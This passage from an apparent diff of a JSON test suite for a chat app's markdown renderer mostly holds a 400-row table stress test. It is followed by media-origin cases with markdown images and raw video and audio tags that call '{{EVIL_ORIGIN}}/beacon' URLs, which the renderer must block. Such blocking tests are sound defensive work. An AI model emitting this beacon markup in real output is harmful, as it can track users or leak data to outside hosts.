| row 115 **bold** `code` |\n| 116 | P4 | 10:55 | 10:56 | 55 | neutral | topic-7 | row 116 **bold** `code` |\n| 117 | P5 | 10:56 | 10:57 | 92 | neutral | topic-8 | row 117 **bold** `code` |\n| 118 | P6 | 10:57 | 10:58 | 129 | positive | topic-9 | row 118 **bold** `code` |\n| 119 | P7 | 10:58 | 10:59 | 166 | neutral | topic-10 | row 119 **bold** `code` |\n| 120 | P1 | 10:59 | 10:00 | 203 | neutral | topic-11 | row 120 **bold** `code` |\n| 121 | P2 | 10:00 | 10:01 | 240 | positive | topic-0 | row 121 **bold** `code` |\n| 122 | P3 | 10:01 | 10:02 | 277 | neutral | topic-1 | row 122 **bold** `code` |\n| 123 | P4 | 10:02 | 10:03 | 14 | neutral | topic-2 | row 123 **bold** `code` |\n| 124 | P5 | 10:03 | 10:04 | 51 | positive | topic-3 | row 124 **bold** `code` |\n| 125 | P6 | 10:04 | 10:05 | 88 | neutral | topic-4 | row 125 **bold** `code` |\n| 126 | P7 | 10:05 | 10:06 | 125 | neutral | topic-5 | row 126 **bold** `code` |\n| 127 | P1 | 10:06 | 10:07 | 162 | positive | topic-6 | row 127 **bold** `code` |\n| 128 | P2 | 10:07 | 10:08 | 199 | neutral | topic-7 | row 128 **bold** `code` |\n| 129 | P3 | 10:08 | 10:09 | 236 | neutral | topic-8 | row 129 **bold** `code` |\n| 130 | P4 | 10:09 | 10:10 | 273 | positive | topic-9 | row 130 **bold** `code` |\n| 131 | P5 | 10:10 | 10:11 | 10 | neutral | topic-10 | row 131 **bold** `code` |\n| 132 | P6 | 10:11 | 10:12 | 47 | neutral | topic-11 | row 132 **bold** `code` |\n| 133 | P7 | 10:12 | 10:13 | 84 | positive | topic-0 | row 133 **bold** `code` |\n| 134 | P1 | 10:13 | 10:14 | 121 | neutral | topic-1 | row 134 **bold** `code` |\n| 135 | P2 | 10:14 | 10:15 | 158 | neutral | topic-2 | row 135 **bold** `code` |\n| 136 | P3 | 10:15 | 10:16 | 195 | positive | topic-3 | row 136 **bold** `code` |\n| 137 | P4 | 10:16 | 10:17 | 232 | neutral | topic-4 | row 137 **bold** `code` |\n| 138 | P5 | 10:17 | 10:18 | 269 | neutral | topic-5 | row 138 **bold** `code` |\n| 139 | P6 | 10:18 | 10:19 | 6 | positive | topic-6 | row 139 **bold** `code` |\n| 140 | P7 | 10:19 | 10:20 | 43 | neutral | topic-7 | row 140 **bold** `code` |\n| 141 | P1 | 10:20 | 10:21 | 80 | neutral | topic-8 | row 141 **bold** `code` |\n| 142 | P2 | 10:21 | 10:22 | 117 | positive | topic-9 | row 142 **bold** `code` |\n| 143 | P3 | 10:22 | 10:23 | 154 | neutral | topic-10 | row 143 **bold** `code` |\n| 144 | P4 | 10:23 | 10:24 | 191 | neutral | topic-11 | row 144 **bold** `code` |\n| 145 | P5 | 10:24 | 10:25 | 228 | positive | topic-0 | row 145 **bold** `code` |\n| 146 | P6 | 10:25 | 10:26 | 265 | neutral | topic-1 | row 146 **bold** `code` |\n| 147 | P7 | 10:26 | 10:27 | 2 | neutral | topic-2 | row 147 **bold** `code` |\n| 148 | P1 | 10:27 | 10:28 | 39 | positive | topic-3 | row 148 **bold** `code` |\n| 149 | P2 | 10:28 | 10:29 | 76 | neutral | topic-4 | row 149 **bold** `code` |\n| 150 | P3 | 10:29 | 10:30 | 113 | neutral | topic-5 | row 150 **bold** `code` |\n| 151 | P4 | 10:30 | 10:31 | 150 | positive | topic-6 | row 151 **bold** `code` |\n| 152 | P5 | 10:31 | 10:32 | 187 | neutral | topic-7 | row 152 **bold** `code` |\n| 153 | P6 | 10:32 | 10:33 | 224 | neutral | topic-8 | row 153 **bold** `code` |\n| 154 | P7 | 10:33 | 10:34 | 261 | positive | topic-9 | row 154 **bold** `code` |\n| 155 | P1 | 10:34 | 10:35 | 298 | neutral | topic-10 | row 155 **bold** `code` |\n| 156 | P2 | 10:35 | 10:36 | 35 | neutral | topic-11 | row 156 **bold** `code` |\n| 157 | P3 | 10:36 | 10:37 | 72 | positive | topic-0 | row 157 **bold** `code` |\n| 158 | P4 | 10:37 | 10:38 | 109 | neutral | topic-1 | row 158 **bold** `code` |\n| 159 | P5 | 10:38 | 10:39 | 146 | neutral | topic-2 | row 159 **bold** `code` |\n| 160 | P6 | 10:39 | 10:40 | 183 | positive | topic-3 | row 160 **bold** `code` |\n| 161 | P7 | 10:40 | 10:41 | 220 | neutral | topic-4 | row 161 **bold** `code` |\n| 162 | P1 | 10:41 | 10:42 | 257 | neutral | topic-5 | row 162 **bold** `code` |\n| 163 | P2 | 10:42 | 10:43 | 294 | positive | topic-6 | row 163 **bold** `code` |\n| 164 | P3 | 10:43 | 10:44 | 31 | neutral | topic-7 | row 164 **bold** `code` |\n| 165 | P4 | 10:44 | 10:45 | 68 | neutral | topic-8 | row 165 **bold** `code` |\n| 166 | P5 | 10:45 | 10:46 | 105 | positive | topic-9 | row 166 **bold** `code` |\n| 167 | P6 | 10:46 | 10:47 | 142 | neutral | topic-10 | row 167 **bold** `code` |\n| 168 | P7 | 10:47 | 10:48 | 179 | neutral | topic-11 | row 168 **bold** `code` |\n| 169 | P1 | 10:48 | 10:49 | 216 | positive | topic-0 | row 169 **bold** `code` |\n| 170 | P2 | 10:49 | 10:50 | 253 | neutral | topic-1 | row 170 **bold** `code` |\n| 171 | P3 | 10:50 | 10:51 | 290 | neutral | topic-2 | row 171 **bold** `code` |\n| 172 | P4 | 10:51 | 10:52 | 27 | positive | topic-3 | row 172 **bold** `code` |\n| 173 | P5 | 10:52 | 10:53 | 64 | neutral | topic-4 | row 173 **bold** `code` |\n| 174 | P6 | 10:53 | 10:54 | 101 | neutral | topic-5 | row 174 **bold** `code` |\n| 175 | P7 | 10:54 | 10:55 | 138 | positive | topic-6 | row 175 **bold** `code` |\n| 176 | P1 | 10:55 | 10:56 | 175 | neutral | topic-7 | row 176 **bold** `code` |\n| 177 | P2 | 10:56 | 10:57 | 212 | neutral | topic-8 | row 177 **bold** `code` |\n| 178 | P3 | 10:57 | 10:58 | 249 | positive | topic-9 | row 178 **bold** `code` |\n| 179 | P4 | 10:58 | 10:59 | 286 | neutral | topic-10 | row 179 **bold** `code` |\n| 180 | P5 | 10:59 | 10:00 | 23 | neutral | topic-11 | row 180 **bold** `code` |\n| 181 | P6 | 10:00 | 10:01 | 60 | positive | topic-0 | row 181 **bold** `code` |\n| 182 | P7 | 10:01 | 10:02 | 97 | neutral | topic-1 | row 182 **bold** `code` |\n| 183 | P1 | 10:02 | 10:03 | 134 | neutral | topic-2 | row 183 **bold** `code` |\n| 184 | P2 | 10:03 | 10:04 | 171 | positive | topic-3 | row 184 **bold** `code` |\n| 185 | P3 | 10:04 | 10:05 | 208 | neutral | topic-4 | row 185 **bold** `code` |\n| 186 | P4 | 10:05 | 10:06 | 245 | neutral | topic-5 | row 186 **bold** `code` |\n| 187 | P5 | 10:06 | 10:07 | 282 | positive | topic-6 | row 187 **bold** `code` |\n| 188 | P6 | 10:07 | 10:08 | 19 | neutral | topic-7 | row 188 **bold** `code` |\n| 189 | P7 | 10:08 | 10:09 | 56 | neutral | topic-8 | row 189 **bold** `code` |\n| 190 | P1 | 10:09 | 10:10 | 93 | positive | topic-9 | row 190 **bold** `code` |\n| 191 | P2 | 10:10 | 10:11 | 130 | neutral | topic-10 | row 191 **bold** `code` |\n| 192 | P3 | 10:11 | 10:12 | 167 | neutral | topic-11 | row 192 **bold** `code` |\n| 193 | P4 | 10:12 | 10:13 | 204 | positive | topic-0 | row 193 **bold** `code` |\n| 194 | P5 | 10:13 | 10:14 | 241 | neutral | topic-1 | row 194 **bold** `code` |\n| 195 | P6 | 10:14 | 10:15 | 278 | neutral | topic-2 | row 195 **bold** `code` |\n| 196 | P7 | 10:15 | 10:16 | 15 | positive | topic-3 | row 196 **bold** `code` |\n| 197 | P1 | 10:16 | 10:17 | 52 | neutral | topic-4 | row 197 **bold** `code` |\n| 198 | P2 | 10:17 | 10:18 | 89 | neutral | topic-5 | row 198 **bold** `code` |\n| 199 | P3 | 10:18 | 10:19 | 126 | positive | topic-6 | row 199 **bold** `code` |\n| 200 | P4 | 10:19 | 10:20 | 163 | neutral | topic-7 | row 200 **bold** `code` |\n| 201 | P5 | 10:20 | 10:21 | 200 | neutral | topic-8 | row 201 **bold** `code` |\n| 202 | P6 | 10:21 | 10:22 | 237 | positive | topic-9 | row 202 **bold** `code` |\n| 203 | P7 | 10:22 | 10:23 | 274 | neutral | topic-10 | row 203 **bold** `code` |\n| 204 | P1 | 10:23 | 10:24 | 11 | neutral | topic-11 | row 204 **bold** `code` |\n| 205 | P2 | 10:24 | 10:25 | 48 | positive | topic-0 | row 205 **bold** `code` |\n| 206 | P3 | 10:25 | 10:26 | 85 | neutral | topic-1 | row 206 **bold** `code` |\n| 207 | P4 | 10:26 | 10:27 | 122 | neutral | topic-2 | row 207 **bold** `code` |\n| 208 | P5 | 10:27 | 10:28 | 159 | positive | topic-3 | row 208 **bold** `code` |\n| 209 | P6 | 10:28 | 10:29 | 196 | neutral | topic-4 | row 209 **bold** `code` |\n| 210 | P7 | 10:29 | 10:30 | 233 | neutral | topic-5 | row 210 **bold** `code` |\n| 211 | P1 | 10:30 | 10:31 | 270 | positive | topic-6 | row 211 **bold** `code` |\n| 212 | P2 | 10:31 | 10:32 | 7 | neutral | topic-7 | row 212 **bold** `code` |\n| 213 | P3 | 10:32 | 10:33 | 44 | neutral | topic-8 | row 213 **bold** `code` |\n| 214 | P4 | 10:33 | 10:34 | 81 | positive | topic-9 | row 214 **bold** `code` |\n| 215 | P5 | 10:34 | 10:35 | 118 | neutral | topic-10 | row 215 **bold** `code` |\n| 216 | P6 | 10:35 | 10:36 | 155 | neutral | topic-11 | row 216 **bold** `code` |\n| 217 | P7 | 10:36 | 10:37 | 192 | positive | topic-0 | row 217 **bold** `code` |\n| 218 | P1 | 10:37 | 10:38 | 229 | neutral | topic-1 | row 218 **bold** `code` |\n| 219 | P2 | 10:38 | 10:39 | 266 | neutral | topic-2 | row 219 **bold** `code` |\n| 220 | P3 | 10:39 | 10:40 | 3 | positive | topic-3 | row 220 **bold** `code` |\n| 221 | P4 | 10:40 | 10:41 | 40 | neutral | topic-4 | row 221 **bold** `code` |\n| 222 | P5 | 10:41 | 10:42 | 77 | neutral | topic-5 | row 222 **bold** `code` |\n| 223 | P6 | 10:42 | 10:43 | 114 | positive | topic-6 | row 223 **bold** `code` |\n| 224 | P7 | 10:43 | 10:44 | 151 | neutral | topic-7 | row 224 **bold** `code` |\n| 225 | P1 | 10:44 | 10:45 | 188 | neutral | topic-8 | row 225 **bold** `code` |\n| 226 | P2 | 10:45 | 10:46 | 225 | positive | topic-9 | row 226 **bold** `code` |\n| 227 | P3 | 10:46 | 10:47 | 262 | neutral | topic-10 | row 227 **bold** `code` |\n| 228 | P4 | 10:47 | 10:48 | 299 | neutral | topic-11 | row 228 **bold** `code` |\n| 229 | P5 | 10:48 | 10:49 | 36 | positive | topic-0 | row 229 **bold** `code` |\n| 230 | P6 | 10:49 | 10:50 | 73 | neutral | topic-1 | row 230 **bold** `code` |\n| 231 | P7 | 10:50 | 10:51 | 110 | neutral | topic-2 | row 231 **bold** `code` |\n| 232 | P1 | 10:51 | 10:52 | 147 | positive | topic-3 | row 232 **bold** `code` |\n| 233 | P2 | 10:52 | 10:53 | 184 | neutral | topic-4 | row 233 **bold** `code` |\n| 234 | P3 | 10:53 | 10:54 | 221 | neutral | topic-5 | row 234 **bold** `code` |\n| 235 | P4 | 10:54 | 10:55 | 258 | positive | topic-6 | row 235 **bold** `code` |\n| 236 | P5 | 10:55 | 10:56 | 295 | neutral | topic-7 | row 236 **bold** `code` |\n| 237 | P6 | 10:56 | 10:57 | 32 | neutral | topic-8 | row 237 **bold** `code` |\n| 238 | P7 | 10:57 | 10:58 | 69 | positive | topic-9 | row 238 **bold** `code` |\n| 239 | P1 | 10:58 | 10:59 | 106 | neutral | topic-10 | row 239 **bold** `code` |\n| 240 | P2 | 10:59 | 10:00 | 143 | neutral | topic-11 | row 240 **bold** `code` |\n| 241 | P3 | 10:00 | 10:01 | 180 | positive | topic-0 | row 241 **bold** `code` |\n| 242 | P4 | 10:01 | 10:02 | 217 | neutral | topic-1 | row 242 **bold** `code` |\n| 243 | P5 | 10:02 | 10:03 | 254 | neutral | topic-2 | row 243 **bold** `code` |\n| 244 | P6 | 10:03 | 10:04 | 291 | positive | topic-3 | row 244 **bold** `code` |\n| 245 | P7 | 10:04 | 10:05 | 28 | neutral | topic-4 | row 245 **bold** `code` |\n| 246 | P1 | 10:05 | 10:06 | 65 | neutral | topic-5 | row 246 **bold** `code` |\n| 247 | P2 | 10:06 | 10:07 | 102 | positive | topic-6 | row 247 **bold** `code` |\n| 248 | P3 | 10:07 | 10:08 | 139 | neutral | topic-7 | row 248 **bold** `code` |\n| 249 | P4 | 10:08 | 10:09 | 176 | neutral | topic-8 | row 249 **bold** `code` |\n| 250 | P5 | 10:09 | 10:10 | 213 | positive | topic-9 | row 250 **bold** `code` |\n| 251 | P6 | 10:10 | 10:11 | 250 | neutral | topic-10 | row 251 **bold** `code` |\n| 252 | P7 | 10:11 | 10:12 | 287 | neutral | topic-11 | row 252 **bold** `code` |\n| 253 | P1 | 10:12 | 10:13 | 24 | positive | topic-0 | row 253 **bold** `code` |\n| 254 | P2 | 10:13 | 10:14 | 61 | neutral | topic-1 | row 254 **bold** `code` |\n| 255 | P3 | 10:14 | 10:15 | 98 | neutral | topic-2 | row 255 **bold** `code` |\n| 256 | P4 | 10:15 | 10:16 | 135 | positive | topic-3 | row 256 **bold** `code` |\n| 257 | P5 | 10:16 | 10:17 | 172 | neutral | topic-4 | row 257 **bold** `code` |\n| 258 | P6 | 10:17 | 10:18 | 209 | neutral | topic-5 | row 258 **bold** `code` |\n| 259 | P7 | 10:18 | 10:19 | 246 | positive | topic-6 | row 259 **bold** `code` |\n| 260 | P1 | 10:19 | 10:20 | 283 | neutral | topic-7 | row 260 **bold** `code` |\n| 261 | P2 | 10:20 | 10:21 | 20 | neutral | topic-8 | row 261 **bold** `code` |\n| 262 | P3 | 10:21 | 10:22 | 57 | positive | topic-9 | row 262 **bold** `code` |\n| 263 | P4 | 10:22 | 10:23 | 94 | neutral | topic-10 | row 263 **bold** `code` |\n| 264 | P5 | 10:23 | 10:24 | 131 | neutral | topic-11 | row 264 **bold** `code` |\n| 265 | P6 | 10:24 | 10:25 | 168 | positive | topic-0 | row 265 **bold** `code` |\n| 266 | P7 | 10:25 | 10:26 | 205 | neutral | topic-1 | row 266 **bold** `code` |\n| 267 | P1 | 10:26 | 10:27 | 242 | neutral | topic-2 | row 267 **bold** `code` |\n| 268 | P2 | 10:27 | 10:28 | 279 | positive | topic-3 | row 268 **bold** `code` |\n| 269 | P3 | 10:28 | 10:29 | 16 | neutral | topic-4 | row 269 **bold** `code` |\n| 270 | P4 | 10:29 | 10:30 | 53 | neutral | topic-5 | row 270 **bold** `code` |\n| 271 | P5 | 10:30 | 10:31 | 90 | positive | topic-6 | row 271 **bold** `code` |\n| 272 | P6 | 10:31 | 10:32 | 127 | neutral | topic-7 | row 272 **bold** `code` |\n| 273 | P7 | 10:32 | 10:33 | 164 | neutral | topic-8 | row 273 **bold** `code` |\n| 274 | P1 | 10:33 | 10:34 | 201 | positive | topic-9 | row 274 **bold** `code` |\n| 275 | P2 | 10:34 | 10:35 | 238 | neutral | topic-10 | row 275 **bold** `code` |\n| 276 | P3 | 10:35 | 10:36 | 275 | neutral | topic-11 | row 276 **bold** `code` |\n| 277 | P4 | 10:36 | 10:37 | 12 | positive | topic-0 | row 277 **bold** `code` |\n| 278 | P5 | 10:37 | 10:38 | 49 | neutral | topic-1 | row 278 **bold** `code` |\n| 279 | P6 | 10:38 | 10:39 | 86 | neutral | topic-2 | row 279 **bold** `code` |\n| 280 | P7 | 10:39 | 10:40 | 123 | positive | topic-3 | row 280 **bold** `code` |\n| 281 | P1 | 10:40 | 10:41 | 160 | neutral | topic-4 | row 281 **bold** `code` |\n| 282 | P2 | 10:41 | 10:42 | 197 | neutral | topic-5 | row 282 **bold** `code` |\n| 283 | P3 | 10:42 | 10:43 | 234 | positive | topic-6 | row 283 **bold** `code` |\n| 284 | P4 | 10:43 | 10:44 | 271 | neutral | topic-7 | row 284 **bold** `code` |\n| 285 | P5 | 10:44 | 10:45 | 8 | neutral | topic-8 | row 285 **bold** `code` |\n| 286 | P6 | 10:45 | 10:46 | 45 | positive | topic-9 | row 286 **bold** `code` |\n| 287 | P7 | 10:46 | 10:47 | 82 | neutral | topic-10 | row 287 **bold** `code` |\n| 288 | P1 | 10:47 | 10:48 | 119 | neutral | topic-11 | row 288 **bold** `code` |\n| 289 | P2 | 10:48 | 10:49 | 156 | positive | topic-0 | row 289 **bold** `code` |\n| 290 | P3 | 10:49 | 10:50 | 193 | neutral | topic-1 | row 290 **bold** `code` |\n| 291 | P4 | 10:50 | 10:51 | 230 | neutral | topic-2 | row 291 **bold** `code` |\n| 292 | P5 | 10:51 | 10:52 | 267 | positive | topic-3 | row 292 **bold** `code` |\n| 293 | P6 | 10:52 | 10:53 | 4 | neutral | topic-4 | row 293 **bold** `code` |\n| 294 | P7 | 10:53 | 10:54 | 41 | neutral | topic-5 | row 294 **bold** `code` |\n| 295 | P1 | 10:54 | 10:55 | 78 | positive | topic-6 | row 295 **bold** `code` |\n| 296 | P2 | 10:55 | 10:56 | 115 | neutral | topic-7 | row 296 **bold** `code` |\n| 297 | P3 | 10:56 | 10:57 | 152 | neutral | topic-8 | row 297 **bold** `code` |\n| 298 | P4 | 10:57 | 10:58 | 189 | positive | topic-9 | row 298 **bold** `code` |\n| 299 | P5 | 10:58 | 10:59 | 226 | neutral | topic-10 | row 299 **bold** `code` |\n| 300 | P6 | 10:59 | 10:00 | 263 | neutral | topic-11 | row 300 **bold** `code` |\n| 301 | P7 | 10:00 | 10:01 | 0 | positive | topic-0 | row 301 **bold** `code` |\n| 302 | P1 | 10:01 | 10:02 | 37 | neutral | topic-1 | row 302 **bold** `code` |\n| 303 | P2 | 10:02 | 10:03 | 74 | neutral | topic-2 | row 303 **bold** `code` |\n| 304 | P3 | 10:03 | 10:04 | 111 | positive | topic-3 | row 304 **bold** `code` |\n| 305 | P4 | 10:04 | 10:05 | 148 | neutral | topic-4 | row 305 **bold** `code` |\n| 306 | P5 | 10:05 | 10:06 | 185 | neutral | topic-5 | row 306 **bold** `code` |\n| 307 | P6 | 10:06 | 10:07 | 222 | positive | topic-6 | row 307 **bold** `code` |\n| 308 | P7 | 10:07 | 10:08 | 259 | neutral | topic-7 | row 308 **bold** `code` |\n| 309 | P1 | 10:08 | 10:09 | 296 | neutral | topic-8 | row 309 **bold** `code` |\n| 310 | P2 | 10:09 | 10:10 | 33 | positive | topic-9 | row 310 **bold** `code` |\n| 311 | P3 | 10:10 | 10:11 | 70 | neutral | topic-10 | row 311 **bold** `code` |\n| 312 | P4 | 10:11 | 10:12 | 107 | neutral | topic-11 | row 312 **bold** `code` |\n| 313 | P5 | 10:12 | 10:13 | 144 | positive | topic-0 | row 313 **bold** `code` |\n| 314 | P6 | 10:13 | 10:14 | 181 | neutral | topic-1 | row 314 **bold** `code` |\n| 315 | P7 | 10:14 | 10:15 | 218 | neutral | topic-2 | row 315 **bold** `code` |\n| 316 | P1 | 10:15 | 10:16 | 255 | positive | topic-3 | row 316 **bold** `code` |\n| 317 | P2 | 10:16 | 10:17 | 292 | neutral | topic-4 | row 317 **bold** `code` |\n| 318 | P3 | 10:17 | 10:18 | 29 | neutral | topic-5 | row 318 **bold** `code` |\n| 319 | P4 | 10:18 | 10:19 | 66 | positive | topic-6 | row 319 **bold** `code` |\n| 320 | P5 | 10:19 | 10:20 | 103 | neutral | topic-7 | row 320 **bold** `code` |\n| 321 | P6 | 10:20 | 10:21 | 140 | neutral | topic-8 | row 321 **bold** `code` |\n| 322 | P7 | 10:21 | 10:22 | 177 | positive | topic-9 | row 322 **bold** `code` |\n| 323 | P1 | 10:22 | 10:23 | 214 | neutral | topic-10 | row 323 **bold** `code` |\n| 324 | P2 | 10:23 | 10:24 | 251 | neutral | topic-11 | row 324 **bold** `code` |\n| 325 | P3 | 10:24 | 10:25 | 288 | positive | topic-0 | row 325 **bold** `code` |\n| 326 | P4 | 10:25 | 10:26 | 25 | neutral | topic-1 | row 326 **bold** `code` |\n| 327 | P5 | 10:26 | 10:27 | 62 | neutral | topic-2 | row 327 **bold** `code` |\n| 328 | P6 | 10:27 | 10:28 | 99 | positive | topic-3 | row 328 **bold** `code` |\n| 329 | P7 | 10:28 | 10:29 | 136 | neutral | topic-4 | row 329 **bold** `code` |\n| 330 | P1 | 10:29 | 10:30 | 173 | neutral | topic-5 | row 330 **bold** `code` |\n| 331 | P2 | 10:30 | 10:31 | 210 | positive | topic-6 | row 331 **bold** `code` |\n| 332 | P3 | 10:31 | 10:32 | 247 | neutral | topic-7 | row 332 **bold** `code` |\n| 333 | P4 | 10:32 | 10:33 | 284 | neutral | topic-8 | row 333 **bold** `code` |\n| 334 | P5 | 10:33 | 10:34 | 21 | positive | topic-9 | row 334 **bold** `code` |\n| 335 | P6 | 10:34 | 10:35 | 58 | neutral | topic-10 | row 335 **bold** `code` |\n| 336 | P7 | 10:35 | 10:36 | 95 | neutral | topic-11 | row 336 **bold** `code` |\n| 337 | P1 | 10:36 | 10:37 | 132 | positive | topic-0 | row 337 **bold** `code` |\n| 338 | P2 | 10:37 | 10:38 | 169 | neutral | topic-1 | row 338 **bold** `code` |\n| 339 | P3 | 10:38 | 10:39 | 206 | neutral | topic-2 | row 339 **bold** `code` |\n| 340 | P4 | 10:39 | 10:40 | 243 | positive | topic-3 | row 340 **bold** `code` |\n| 341 | P5 | 10:40 | 10:41 | 280 | neutral | topic-4 | row 341 **bold** `code` |\n| 342 | P6 | 10:41 | 10:42 | 17 | neutral | topic-5 | row 342 **bold** `code` |\n| 343 | P7 | 10:42 | 10:43 | 54 | positive | topic-6 | row 343 **bold** `code` |\n| 344 | P1 | 10:43 | 10:44 | 91 | neutral | topic-7 | row 344 **bold** `code` |\n| 345 | P2 | 10:44 | 10:45 | 128 | neutral | topic-8 | row 345 **bold** `code` |\n| 346 | P3 | 10:45 | 10:46 | 165 | positive | topic-9 | row 346 **bold** `code` |\n| 347 | P4 | 10:46 | 10:47 | 202 | neutral | topic-10 | row 347 **bold** `code` |\n| 348 | P5 | 10:47 | 10:48 | 239 | neutral | topic-11 | row 348 **bold** `code` |\n| 349 | P6 | 10:48 | 10:49 | 276 | positive | topic-0 | row 349 **bold** `code` |\n| 350 | P7 | 10:49 | 10:50 | 13 | neutral | topic-1 | row 350 **bold** `code` |\n| 351 | P1 | 10:50 | 10:51 | 50 | neutral | topic-2 | row 351 **bold** `code` |\n| 352 | P2 | 10:51 | 10:52 | 87 | positive | topic-3 | row 352 **bold** `code` |\n| 353 | P3 | 10:52 | 10:53 | 124 | neutral | topic-4 | row 353 **bold** `code` |\n| 354 | P4 | 10:53 | 10:54 | 161 | neutral | topic-5 | row 354 **bold** `code` |\n| 355 | P5 | 10:54 | 10:55 | 198 | positive | topic-6 | row 355 **bold** `code` |\n| 356 | P6 | 10:55 | 10:56 | 235 | neutral | topic-7 | row 356 **bold** `code` |\n| 357 | P7 | 10:56 | 10:57 | 272 | neutral | topic-8 | row 357 **bold** `code` |\n| 358 | P1 | 10:57 | 10:58 | 9 | positive | topic-9 | row 358 **bold** `code` |\n| 359 | P2 | 10:58 | 10:59 | 46 | neutral | topic-10 | row 359 **bold** `code` |\n| 360 | P3 | 10:59 | 10:00 | 83 | neutral | topic-11 | row 360 **bold** `code` |\n| 361 | P4 | 10:00 | 10:01 | 120 | positive | topic-0 | row 361 **bold** `code` |\n| 362 | P5 | 10:01 | 10:02 | 157 | neutral | topic-1 | row 362 **bold** `code` |\n| 363 | P6 | 10:02 | 10:03 | 194 | neutral | topic-2 | row 363 **bold** `code` |\n| 364 | P7 | 10:03 | 10:04 | 231 | positive | topic-3 | row 364 **bold** `code` |\n| 365 | P1 | 10:04 | 10:05 | 268 | neutral | topic-4 | row 365 **bold** `code` |\n| 366 | P2 | 10:05 | 10:06 | 5 | neutral | topic-5 | row 366 **bold** `code` |\n| 367 | P3 | 10:06 | 10:07 | 42 | positive | topic-6 | row 367 **bold** `code` |\n| 368 | P4 | 10:07 | 10:08 | 79 | neutral | topic-7 | row 368 **bold** `code` |\n| 369 | P5 | 10:08 | 10:09 | 116 | neutral | topic-8 | row 369 **bold** `code` |\n| 370 | P6 | 10:09 | 10:10 | 153 | positive | topic-9 | row 370 **bold** `code` |\n| 371 | P7 | 10:10 | 10:11 | 190 | neutral | topic-10 | row 371 **bold** `code` |\n| 372 | P1 | 10:11 | 10:12 | 227 | neutral | topic-11 | row 372 **bold** `code` |\n| 373 | P2 | 10:12 | 10:13 | 264 | positive | topic-0 | row 373 **bold** `code` |\n| 374 | P3 | 10:13 | 10:14 | 1 | neutral | topic-1 | row 374 **bold** `code` |\n| 375 | P4 | 10:14 | 10:15 | 38 | neutral | topic-2 | row 375 **bold** `code` |\n| 376 | P5 | 10:15 | 10:16 | 75 | positive | topic-3 | row 376 **bold** `code` |\n| 377 | P6 | 10:16 | 10:17 | 112 | neutral | topic-4 | row 377 **bold** `code` |\n| 378 | P7 | 10:17 | 10:18 | 149 | neutral | topic-5 | row 378 **bold** `code` |\n| 379 | P1 | 10:18 | 10:19 | 186 | positive | topic-6 | row 379 **bold** `code` |\n| 380 | P2 | 10:19 | 10:20 | 223 | neutral | topic-7 | row 380 **bold** `code` |\n| 381 | P3 | 10:20 | 10:21 | 260 | neutral | topic-8 | row 381 **bold** `code` |\n| 382 | P4 | 10:21 | 10:22 | 297 | positive | topic-9 | row 382 **bold** `code` |\n| 383 | P5 | 10:22 | 10:23 | 34 | neutral | topic-10 | row 383 **bold** `code` |\n| 384 | P6 | 10:23 | 10:24 | 71 | neutral | topic-11 | row 384 **bold** `code` |\n| 385 | P7 | 10:24 | 10:25 | 108 | positive | topic-0 | row 385 **bold** `code` |\n| 386 | P1 | 10:25 | 10:26 | 145 | neutral | topic-1 | row 386 **bold** `code` |\n| 387 | P2 | 10:26 | 10:27 | 182 | neutral | topic-2 | row 387 **bold** `code` |\n| 388 | P3 | 10:27 | 10:28 | 219 | positive | topic-3 | row 388 **bold** `code` |\n| 389 | P4 | 10:28 | 10:29 | 256 | neutral | topic-4 | row 389 **bold** `code` |\n| 390 | P5 | 10:29 | 10:30 | 293 | neutral | topic-5 | row 390 **bold** `code` |\n| 391 | P6 | 10:30 | 10:31 | 30 | positive | topic-6 | row 391 **bold** `code` |\n| 392 | P7 | 10:31 | 10:32 | 67 | neutral | topic-7 | row 392 **bold** `code` |\n| 393 | P1 | 10:32 | 10:33 | 104 | neutral | topic-8 | row 393 **bold** `code` |\n| 394 | P2 | 10:33 | 10:34 | 141 | positive | topic-9 | row 394 **bold** `code` |\n| 395 | P3 | 10:34 | 10:35 | 178 | neutral | topic-10 | row 395 **bold** `code` |\n| 396 | P4 | 10:35 | 10:36 | 215 | neutral | topic-11 | row 396 **bold** `code` |\n| 397 | P5 | 10:36 | 10:37 | 252 | positive | topic-0 | row 397 **bold** `code` |\n| 398 | P6 | 10:37 | 10:38 | 289 | neutral | topic-1 | row 398 **bold** `code` |\n| 399 | P7 | 10:38 | 10:39 | 26 | neutral | topic-2 | row 399 **bold** `code` |\n| 400 | P1 | 10:39 | 10:40 | 63 | positive | topic-3 | row 400 **bold** `code` |\n\nEnd of index.",
+        "chunking": "lines"
+      },
+      "expectedOutcome": "All 400 body rows render; the message completes within budget; long-task time is reported (budget is a measurement, not a hard pass/fail in WebKit).",
+      "assert": {
+        "requiredSelectors": [
+          {
+            "selector": "table tbody tr",
+            "count": 400
+          }
+        ],
+        "finalizeWithinMs": 15000,
+        "maxLongTaskMs": 2000
+      }
+    },
+    {
+      "id": "media-md-image-allowed",
+      "category": "media-origin",
+      "title": "Markdown image from the allowed origin (control)",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "![Whiteboard]({{ALLOWED_ORIGIN}}/media/whiteboard.png)",
+        "chunking": "words"
+      },
+      "expectedOutcome": "The image renders with alt 'Whiteboard' and is fetched from the allowed origin.",
+      "assert": {
+        "requiredSelectors": [
+          {
+            "selector": "img[alt='Whiteboard']",
+            "count": 1
+          }
+        ],
+        "allowedMediaRequestsMin": 1
+      }
+    },
+    {
+      "id": "media-md-image-disallowed",
+      "category": "media-origin",
+      "title": "Markdown image from a disallowed origin",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "![Pixel]({{EVIL_ORIGIN}}/beacon/md-image.png) and ![ref][p]\n\n[p]: {{EVIL_ORIGIN}}/beacon/md-ref-image.png",
+        "chunking": "words"
+      },
+      "expectedOutcome": "No request reaches the evil origin; a blocked placeholder ([data-testid='km-media-blocked']) or the alt text shows instead.",
+      "assert": {}
+    },
+    {
+      "id": "media-raw-video-audio",
+      "category": "media-origin",
+      "title": "Raw <video>/<audio>/<source> tags in markdown",
+      "delivery": {
+        "kind": "markdown",
+        "markdown": "<video src=\"{{EVIL_ORIGIN}}/beacon/raw-video.mp4\" autoplay></video><audio><source src=\"{{EVIL_ORIGIN}}/beacon/raw-audio.wav\"></audio> text",
+        "chunking": "words"
+      },
+      "expectedOutcome": "Raw media tags are stripped (media only via km.media); zero evil requests.",
+      "assert": {
+        "forbiddenSelectors": [
+          "video",
+          "audio",
+          "source"
+        ],
+        "mustShowText": [
+          "text"
+        ]
+      }
+    },
+    {
+      "id": "media-custom-image-allowed",
+      "category": "media-origin",
+      "title": "km.media image from the allowed origin (control)",
+      "delivery": {
+        "kind": "custom",
